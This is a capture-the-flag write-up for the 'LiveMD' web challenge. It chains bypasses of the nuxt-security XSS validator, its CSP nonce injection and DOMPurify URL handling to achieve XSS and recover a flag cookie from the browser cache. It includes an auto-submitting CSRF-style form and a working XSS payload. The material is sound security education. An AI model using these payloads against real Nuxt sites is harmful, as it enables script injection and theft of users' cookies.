# LiveMD

* Category: Web
* Score: 500/500
* Solves: 0

## Description

A simple and secure markdown editor to preview markdown in real-time.

## Overview

The target is to find XSS in this markdown editor and steal the flag from the cookie.

## Solution

One of the first thing to notice is that putting HTML in the `markdown` query parameter would result in 400 Bad Request. e.g. `?markdown=<script>alert(1)</script>`

The reason this is happening is due to the [XSS Validator](https://nuxt-security.vercel.app/middleware/xss-validator) middleware provided by [nuxt-security](https://github.com/nuxt-modules/security), which is enabled by default. However, its [implementation](https://github.com/nuxt-modules/security/blob/70cd67a4690b53e9167c210e3e020faed901355d/src/runtime/server/middleware/xssValidator.ts#L27-L34) is far from perfect:

```typescript
const valueToFilter =
    event.node.req.method === 'GET'
    ? getQuery(event)
    : event.node.req.headers['content-type']?.includes(
        'multipart/form-data'
        )
    ? await readMultipartFormData(event)
    : await readBody(event)
```

It does not filter the query parameters if the request is not a GET request. So a simple bypass is to use POST request instead of GET request but still put the payload in the query parameter.

To do so, host this html on attack's server:

```html
<form method="post" id="f" target="tab">
    <button>Go</button>
</form>
<script>
    markdown = 'x<script>alert(1)<\/script>'
    f.action = 'http://localhost:3000/?' + new URLSearchParams({ markdown })
    f.submit()
    setTimeout(() => open('http://localhost:3000/print', 'tab'), 1000)
</script>
```

Of course the alert will not work because the html also have to go through DOMPurify's sanitization (unless you can drop a DOMPurify 0day :P). Let just ignore it first by disabling the sanitization locally first by changing `purify.ts` to:

```javascript
export const sanitize = (html: string) => html
```

Then try to view the source of the `/print` page, you will see a very interesting thing:

```html
<p>x<script nonce="cYuXsFEgiRBMrYMW2Cs2lEwt" nonce="cYuXsFEgiRBMrYMW2Cs2lEwt">alert(1)</script></p>
```

Apparently, the `nonce` got added to the script tag twice somewhere in the server-side rendering process. This *feature* also is also provided by nuxt-security module mentioned before, which is [implemented here](https://github.com/nuxt-modules/security/blob/70cd67a4690b53e9167c210e3e020faed901355d/src/runtime/nitro/plugins/40-cspSsrNonce.ts#L53-L73):

```javascript
for (const section of sections) {
    html[section] = html[section].map((element) => {
        // Skip non-string elements
        if (typeof element !== 'string') {
            return element;
        }
        // Add nonce to all link tags
        element = element.replace(LINK_RE, (match, rest) => {
            return `<link nonce="${nonce}"` + rest
        })
        // Add nonce to all script tags
        element = element.replace(SCRIPT_RE, (match, rest) => {
            return `<script nonce="${nonce}"` + rest
        })
        // Add nonce to all style tags
        element = element.replace(STYLE_RE, (match, rest) => {
            return `<style nonce="${nonce}"` + rest
        })
        return element
    })
}
```

It literally use string replacement to add the `nonce` attribute to the script tag, which can be really bad if `<script>` appear in the attribute context. This is exactly the case where DOMPurify [warn you against](https://github.com/cure53/DOMPurify#is-there-any-foot-gun-potential).

> [You can ignore this part] And the reason that `nonce` is added twice comes from the use of server component (`print.server.vue` implies it), which is implemented as island, which means the rendered html will go through `render:html` hook twice.

So if we can get `<script>` to appear in attribute, it is possible to break the effect of sanitization and get arbitrary HTML in HTML context. To do so, you have to bypass this simple filter in `purify.ts`:

```javascript
purify.addHook('uponSanitizeAttribute', (currentNode, event, config) => {
    event.keepAttr = false
    try {
        if (event.attrName === 'src' || event.attrName === 'href') {
            if (URL.canParse(event.attrValue)) {
                // absolute URL
                event.attrValue = new URL(event.attrValue).href
            } else {
                // relative URL
                const u = new URL(event.attrValue, import.meta.server ? 'http://localhost' : document.baseURI)
                event.attrValue = u.pathname + u.search + u.hash
            }
            event.keepAttr = true
        }
    } catch {}
})
```

which only allows `src` and `href` attribute to have valid absolute/relative URL. And the value also have to go thorugh `URL` constructor, which protect against simple attempts like `<a href="http://example.com/?<script>1</script>">link</a>`.

Data url is a good candidate to prevent `<` and `>` from being encoded by `URL`, but it will be blocked by DOMPurify afterward. But if you just change it to `<a href="data2:<script>123</script>">link</a>`, then it works magically. (note: there must be no `//` after `:`)

The output would be:

```html
<a href="data2:<script nonce="/iECgPp28V0jFiPdhkQm+KRw" nonce="/iECgPp28V0jFiPdhkQm+KRw">123</script>
```

The reason why this works is because it [make](https://url.spec.whatwg.org/#scheme-state) URL parser to enter [opaque path state](https://url.spec.whatwg.org/#cannot-be-a-base-url-path-state), which does not encode characters like `<` and `>`.

So the `123` would be in HTML context, so a payload like `<a href="data2:<script><script>alert(origin)</script>">link</a>` should surely work right? Because CSP here allows nonce and our script tag would have nonce added automatically by nuxt-security. But actually using it still result in CSP error `Refused to execute inline script because it violates the following Content Security Policy directive: ...` despite the rendered HTML is:

```html
<a href="data2:<script nonce="B83NF1JLVW7i8vSdMRTRWcg1" nonce="B83NF1JLVW7i8vSdMRTRWcg1"><script nonce="B83NF1JLVW7i8vSdMRTRWcg1" nonce="B83NF1JLVW7i8vSdMRTRWcg1">alert(origin)</script>">link</a>
```

The reason this is not working is because CSP have an algorithm to determine whether an element is [nonceable](https://www.w3.org/TR/CSP3/#is-element-nonceable), which checks whether the element have attributes with `<script` or `<style` or **duplicate attributes** to prevent dangling markup injection. This algorithm is implemented by Chromium [here](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/frame/csp/content_security_policy.cc;l=216-255;drc=98be4ecad4b81e303412a33e7413d2a024f759ae).

So we have to find a way to make our target script tag to have only one nonce attribute in order to have XSS. My idea to use make it output a HTML like this:

```html
<script somehow_put_an_double_quote_here_like_this:"<link nonce="aaa" nonce="aaa">alert(origin)</script>
```

This way, the first nonce would be parsed as an attribute value so there will be no duplicate nonce attribute. I also specifically use `link` tag to inject nonce because the nonceable algorithm does not check for it.

However, the `somehow_put_an_double_quote_here_like_this` is entirely not trivial because the nonce-injecting nitro plugin always put the nonce attribute as the first attribute of `<script>` tag. My idea here is to encode `<` as `&lt;` and put it in `srcdoc` to prevent the string replacement from adding the nonce attribute.

Constructing a correct payload for this require a lot of trial and error so I can't really explain how I end up with this payload:

```html
<div src="data2:<script><iframe useless='">' srcdoc='&lt;script <a href="data2:<link>"></a>>";alert(origin);&lt;/script>'</div>
```

But anyway, this payload will finally pop an alert so we have XSS now, so the final step is to steal the flag from cookie. But..., the flag is initially stored in the `markdown` cookie initially, and accessing `/?markdown=...` would override it, so the flag is already gone by the time we have XSS.

The trick here is actually very simple, since `/print` route is server-side rendered, if we accessed it first and have it cached in the browser. We can still access the flag from browser cache with fetch option `cache: 'only-if-cached'`.

The final exploit can be found [here](./exp.html).
